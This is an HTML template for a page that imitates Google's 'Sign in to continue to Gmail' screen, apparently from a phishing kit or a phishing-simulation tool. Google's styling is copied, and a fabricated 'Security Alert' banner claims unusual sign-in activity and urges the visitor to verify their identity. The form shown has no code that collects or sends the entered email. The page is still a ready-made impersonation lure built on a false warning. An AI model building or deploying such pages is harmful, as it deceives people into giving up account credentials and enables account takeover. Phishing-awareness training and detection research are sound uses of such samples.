<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            max-width: 450px;
            width: 100%;
        }

        .logo {
            text-align: center;
            margin-bottom: 16px;
        }

        .logo img {
            height: 30px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
            text-align: center;
        }

        .subtitle {
            font-size: 16px;
            color: #202124;
            text-align: center;
            margin-bottom: 24px;
        }

        .alert {
            background: #fef7e0;
            border: 1px solid #f9ab00;
            border-radius: 4px;
            padding: 12px 16px;
            margin-bottom: 24px;
            font-size: 14px;
            color: #202124;
        }

        .form-group {
            margin-bottom: 24px;
        }

        input[type="email"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
        }

        input:focus {
            outline: none;
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }

        .forgot-email {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .guest-mode {
            background: #f1f3f4;
            border-radius: 4px;
            padding: 12px 16px;
            margin: 24px 0;
            font-size: 14px;
            color: #5f6368;
        }

        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .btn-create {
            color: #1a73e8;
            background: none;
            border: none;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            padding: 8px 16px;
        }

        .btn-next {
            background: #1a73e8;
            color: #fff;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .btn-next:hover {
            background: #1765cc;
        }

        .footer {
            margin-top: 32px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #5f6368;
        }

        .footer a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 16px;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo">
            <img src="/static/brands/google.jpg" alt="Google">
        </div>

        <h1>Sign in</h1>
        <div class="subtitle">to continue to Gmail</div>

        <div class="alert">
            ⚠️ <strong>Security Alert:</strong> Unusual sign-in activity detected. Please verify your identity to secure
            your account.
        </div>

        <form>
            <div class="form-group">
                <input type="email" placeholder="Email or phone" required autofocus>
                <a href="#" class="forgot-email">Forgot email?</a>
            </div>

            <div class="guest-mode">
                Not your computer? Use Guest mode to sign in privately.
                <a href="#" style="color: #1a73e8; text-decoration: none;">Learn more</a>
            </div>

            <div class="buttons">
                <button type="button" class="btn-create">Create account</button>
                <button type="submit" class="btn-next">Next</button>
            </div>
        </form>

        <div class="footer">
            <div>
                <select style="border: none; background: none; color: #5f6368;">
                    <option>English (United States)</option>
                </select>
            </div>
            <div>
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>
</body>

</html>
